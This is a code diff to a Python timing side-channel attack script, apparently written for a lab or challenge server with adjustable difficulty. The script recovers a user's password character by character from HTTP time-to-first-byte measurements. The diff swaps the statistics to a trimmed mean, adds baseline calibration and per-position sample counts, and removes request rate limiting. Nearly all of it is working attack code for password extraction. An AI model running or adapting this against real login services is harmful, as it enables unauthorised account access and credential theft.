@@ -32,7 +32,7 @@ logger = Logger(enabled=False)
 
 class MeasuresCollector:
     def __init__(self):
-        # posision -> char -> measurements
+        # position -> char -> measurements
         self.measurements: Dict[int, Dict[str, List[int]]] = defaultdict(
             lambda: defaultdict(list)
         )
@@ -62,34 +62,23 @@ class MeasuresCollector:
             if char in self.measurements[position]
         }
 
-def robust_median(
+def trimmed_mean(
     samples: List[int],
-    min_samples_for_filtering: int = 5,
-    mad_threshold: float = 3.5
+    trim_percentage: float = 0.1
 ) -> float:
     if not samples:
-        raise ValueError("No samples provided")
-
-    if len(samples) < min_samples_for_filtering:
-        return statistics.median(samples)
-
-    median = statistics.median(samples)
-
-    deviations = [abs(x - median) for x in samples]
-    mad = statistics.median(deviations)
-
-    if mad == 0:
-        return median
-
-    filtered = [
-        x for x in samples
-        if abs(x - median) / mad <= mad_threshold
-    ]
-
-    if len(filtered) < min_samples_for_filtering // 2:
-        return median
-
-    return statistics.median(filtered) 
+        return 0.0
+    
+    if len(samples) <= 3:
+        return statistics.mean(samples)
+    
+    sorted_samples = sorted(samples)
+    n = len(sorted_samples)
+    trim_count = max(1, int(trim_percentage * n))
+    
+    trimmed = sorted_samples[:-trim_count]
+    
+    return statistics.mean(trimmed)
 
 # ==========================
 # Victim Server Configuration
@@ -157,6 +146,7 @@ class AsyncHTTPSender(RequestSender):
         self.pool_size = pool_size
         self.session = None
         self.timeout_sec = timeout_sec
+        self.attacker = None  # for baseline (added for calibration)
 
     async def _setup_session(self) -> None:
         """Create and configure a requests Session with connection pooling."""
@@ -184,24 +174,27 @@ class AsyncHTTPSender(RequestSender):
 
 
     async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]:
-        """Send a single request with combined fixed + variable payload.
-
-        Args:
-            payload: Dynamic part of the query parameters.
-
-        Returns:
-            Tuple containing stripped response text and elapsed time in microseconds.
-            On error returns ("", 0).
-        """
+        """Send a single request and measure Time To First Byte in microseconds."""
         request = self.fixed_payload.copy()
         request.update(payload)
 
         try:
             start_ns = time.perf_counter_ns()
-            
+
             async with self.session.get(url=self.url, params=request) as response:
-                body_txt = (await response.text()).strip()
-            elapsed_us = (time.perf_counter_ns() - start_ns) // 1000
+                # מדידת זמן עד קבלת הבית הראשון!
+                await response.content.read(1)  # זה יחכה עד שמגיע בית אחד מהשרת
+                ttfb_ns = time.perf_counter_ns() - start_ns
+
+                # עכשיו קוראים את שאר התוכן (קטן מאוד – "1" או "0")
+                remaining = await response.text()
+                body_txt = ("1" if remaining.startswith("1") else "0").strip()
+
+            elapsed_us = ttfb_ns // 1000
+
+            # חיסור baseline אם קיים
+            if self.attacker and self.attacker.baseline_us is not None:
+                elapsed_us = max(0, elapsed_us - int(self.attacker.baseline_us))
 
             return body_txt, int(elapsed_us)
             
@@ -218,18 +211,14 @@ class AsyncHTTPSender(RequestSender):
 # ==========================
 class AsyncSampler:
     """Utility to collect multiple timing samples for a given payload."""
-    def __init__(self, sender: RequestSender, rate_limit: Optional[int]):
+    def __init__(self, sender: RequestSender):
         """Initialize sampler with a request sender.
         Args:    
             sender: Object responsible for sending HTTP requests.
         """
         self.sender = sender
-        self._rate_limit = rate_limit
-        self._semaphore = None
-        if rate_limit:
-            self._semaphore = asyncio.Semaphore(rate_limit)
 
-    async def _run_sample(self, payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
+    async def run_sample(self, payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
         """Run multiple requests and collect timing data concurrently.
         """
         if isinstance(self.sender, AsyncHTTPSender) and self.sender.session is None:
@@ -242,17 +231,7 @@ class AsyncSampler:
         times = [elapsed_time for _, elapsed_time in results if elapsed_time > 0]
         
         return bodies[-1], times
-    
-    async def run_sample(self, payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
-        """
-        Run multiple requests and collect timing data concurrently.
-        """
-        if self._rate_limit:
-            async with self._semaphore:
-                await asyncio.sleep(1 / self._rate_limit)
-            return await self._run_sample(payload, n_samples)
-        else:
-            return await self._run_sample(payload, n_samples)
+
 
 class MedianDecisionEngine(DecisionEngine):
     """Decision engine using robust median timing."""
@@ -262,22 +241,16 @@ class MedianDecisionEngine(DecisionEngine):
         min_samples: int = 2,
         min_samples_for_filtering: int = 5,
         mad_threshold: float = 3.5,
+        difficulty: int = 1  # Added for trim_pct
     ):
         self.min_samples = min_samples
         self.min_samples_for_filtering = min_samples_for_filtering
         self.mad_threshold = mad_threshold
+        self.difficulty = difficulty
 
     def decide(self, candidates: Dict[str, List[int]]) -> str:
         top = self.decide_top_k(candidates, top_k=1)
-
-        if top:
-            return top[0][0]
-        
-        elif candidates:
-            return max(candidates, key=lambda c: robust_median(candidates[c]))
-        
-        else:
-            return "a"
+        return top[0][0] if top else ""
 
     def decide_top_k(
         self, candidates: Dict[str, List[int]], top_k: int = 3
@@ -286,17 +259,16 @@ class MedianDecisionEngine(DecisionEngine):
         if not candidates:
             return []
 
+        # Added: trim_pct dynamic based on difficulty
+        trim_pct = 0.05 if self.difficulty <= 5 else 0.10 + (self.difficulty - 5) * 0.01
+
         medians: Dict[str, float] = {}
 
         for char, times in candidates.items():
             if len(times) < self.min_samples:
                 continue
 
-            medians[char] = robust_median(
-                times,
-                min_samples_for_filtering=self.min_samples_for_filtering,
-                mad_threshold=self.mad_threshold,
-            )
+            medians[char] = trimmed_mean(times, trim_percentage=trim_pct)
 
         if not medians:
             return []
@@ -315,7 +287,7 @@ class TimingAttacker:
     def __init__(
         self,
         victim_server: VictimServer,
-        sender: AsyncSampler,
+        sender: AsyncHTTPSender,
         base_payload: Dict[str, Any],
         decision_engine: DecisionEngine,
         padding: str = "@"
@@ -331,12 +303,26 @@ class TimingAttacker:
         """
         self.victim = victim_server
         self.sender = sender
-        self.sampler = AsyncSampler(sender, rate_limit=20 if victim_server.difficulty > 5 else None)
+        self.sender.attacker = self  # For baseline access
+        self.sampler = AsyncSampler(sender)
         self.base_payload = base_payload
         self.decision_engine = decision_engine
         self.padding = padding
         self.measures_memory: MeasuresCollector = MeasuresCollector()
+        self.baseline_us: float | None = None  # Added for calibration
         self._min_gap_us = self._compute_min_gap_us()
+
+    async def calibrate_baseline(self, n_samples: int = 30) -> None:
+        """מדידת זמן בסיסי לבקשה 'מינימלית' – משהו שלא תלוי בסיסמה או באורך."""
+        payload = {"password": "a"}  # תו אחד שגוי – זה יגרום להשהיה מינימלית קבועה
+        
+        _, times = await self.sampler.run_sample(payload, n_samples=n_samples)
+        
+        if times:
+            self.baseline_us = trimmed_mean(times)  # Use trimmed_mean for consistency
+            logger.log(f"Baseline calibrated: {self.baseline_us:.0f} µs")
+        else:
+            self.baseline_us = None
 
     def _gap_confidence_score(
             self,
@@ -378,7 +364,7 @@ class TimingAttacker:
     async def _measure_candidates(
         self,
         candidates: List[str],
-        posision: int, 
+        position: int, 
         prefix: str,
         suffix: str,
         new_samples_per_candidate: int
@@ -404,9 +390,9 @@ class TimingAttacker:
         results = await asyncio.gather(*tasks, return_exceptions=False)
 
         for char, samples in results:
-            self.measures_memory.add(posision, char, samples)
+            self.measures_memory.add(position, char, samples)
 
-        measures = self.measures_memory.get_subset(posision, candidates)
+        measures = self.measures_memory.get_subset(position, candidates)
 
         return measures
 
@@ -416,7 +402,7 @@ class TimingAttacker:
         Returns:
             Tuple of (gap_in_us, best_character).
         """
-        medians = {char: robust_median(char_measures) for char, char_measures in samples.items() if char_measures}
+        medians = {char: trimmed_mean(char_measures) for char, char_measures in samples.items() if char_measures}
 
         if not medians:
             return 0, "a"
@@ -427,9 +413,20 @@ class TimingAttacker:
 
         return best_time - second_time, best_char
 
+    def _samples_for_position(self, position: int) -> int:
+        """
+        מחזיר מספר דגימות מומלץ לפוזיציה נתונה.
+        ככל שהפוזיציה גבוהה יותר – יותר דגימות.
+        """
+        base = 10 * self.victim.difficulty
+        progressive = 15 * self.victim.difficulty * (position // 3 + 1)
+        constant_boost = self.victim.difficulty * self.victim.difficulty * 2
+        
+        return base + progressive + constant_boost
+
     async def _attack_position(
         self,
-        posision: int,
+        position: int,
         prefix: str,
         suffix: str,
         top_k: int,
@@ -445,6 +442,9 @@ class TimingAttacker:
             The recovered character
         """
         candidates = list(self.victim.alphabet)
+        
+        # דגימות דינמיות לפי מיקום
+        initial_samples = max(initial_samples, self._samples_for_position(position))
         samples_per_candidate = initial_samples
         round_number = 0
 
@@ -456,12 +456,12 @@ class TimingAttacker:
             logger.log(f"       round num {round_number} | candidates: {candidates} | samples_p_candidates: {samples_per_candidate}")
             
             candidates_samples = await self._measure_candidates(
-                candidates, posision, prefix, suffix, samples_per_candidate
+                candidates, position, prefix, suffix, samples_per_candidate
             )
 
             gap, best_char = self._calc_gap(candidates_samples)
             gap_confidence = self._gap_confidence_score(gap_us=gap,
-                                                        samples_per_candidate=len(self.measures_memory.get(posision, best_char)))
+                                                        samples_per_candidate=len(self.measures_memory.get(position, best_char)))
             logger.log(f"       best_char '{best_char}' | gap {gap}")
 
             if gap >= self._min_gap_us and gap_confidence >= min_gap_confidence:
@@ -497,7 +497,7 @@ class TimingAttacker:
             if body_txt == "1":
                 return prefix + char, body_txt
 
-        return prefix + char, body_txt
+        return prefix, body_txt
     
     def _compute_min_gap_us(self, confidence_sigma: float = 3.0) -> int:
         mean_gap_ms = self.victim.base_stall_ms / self.victim.difficulty
@@ -507,12 +507,8 @@ class TimingAttacker:
 
         min_gap_ms = mean_gap_ms - confidence_sigma * total_noise_std_ms
         min_gap_ms = max(0, min_gap_ms)
-        print(f"########################### min_gap_us: {min_gap_ms * 1000} ##############################")
-
-        difficulty_factor = self.victim.difficulty / 10 if self.victim.difficulty < 10 else 1
-        m_gap = int(min_gap_ms * 1000)#* difficulty_factor
-        print(f"########################### m_gap: {m_gap} ##############################")
-        return m_gap
+        # print(f"########################### min_gap_us: {min_gap_ms * 1000} ##############################")
+        return int(min_gap_ms * 1000)
         
     
     async def attack(
@@ -527,7 +523,7 @@ class TimingAttacker:
     ) -> Tuple[str, str]:
         """Perform the complete timing attack.
 
-        Args:S
+        Args:
             password_len: Length of the password (as detected or known).
             top_k: Number of candidates to keep between rounds.
             max_rounds: Maximum refinement rounds per position.
@@ -550,7 +546,7 @@ class TimingAttacker:
             logger.log(f"    Attack position {pos} | prefix: {password} suffix: {suffix}")
 
             next_char = await self._attack_position(
-                posision=pos,
+                position=pos,
                 prefix=password,
                 suffix=suffix,
                 top_k=top_k,
@@ -575,7 +571,7 @@ class TimingAttacker:
 async def commit_full_attack(username: str, victim: VictimServer, difficulty: int = 1, retries_on_fail: int = 5):
     base_payload = {"user": username, "difficulty": difficulty}
     async_http_sender = AsyncHTTPSender(url=victim.url, base_payload=base_payload)
-    median_decision_engine = MedianDecisionEngine(min_samples=2 if difficulty <= 5 else 4)
+    median_decision_engine = MedianDecisionEngine(min_samples=2 if difficulty <= 5 else 4, difficulty=difficulty)
     
     attacker = TimingAttacker(
         victim_server=victim,
@@ -584,13 +580,15 @@ async def commit_full_attack(username: str, victim: VictimServer, difficulty: in
         decision_engine=median_decision_engine
     )
 
+    await attacker.calibrate_baseline(n_samples=40 if difficulty >= 6 else 20)  # Added calibration
+
     for attempt in range(1, retries_on_fail + 1):
         print(f"Difficulty ({difficulty}) attempt {attempt}")
         try:
             password_length = await attacker.detect_password_length(samples_for_pwd_len=min(max(4, difficulty), 8))
             print(f"    password length = {password_length}")
             password, attack_status = await attacker.attack(password_len=password_length, 
-                                                            initial_samples=3,#3 if difficulty <= 5 else 10,
+                                                            initial_samples=3 if difficulty <= 5 else 4,
                                                             sample_increment=2,
                                                             max_samples=10 if difficulty <= 5 else difficulty * 10,
                                                             top_k=3 if difficulty <= 5 else 5,
@@ -617,7 +615,7 @@ async def main():
     victim = VictimServer(url=BASE_URL)
 
     total_start_ns = time.perf_counter()
-    for difficulty in [6]:#range(1, MAX_DIFFICULTY + 1):
+    for difficulty in range(1, MAX_DIFFICULTY + 1):
         victim = VictimServer(url=BASE_URL, difficulty=difficulty)
         start_ns = time.perf_counter()
         password = await commit_full_attack(username=USERNAME, victim=victim, difficulty=difficulty)
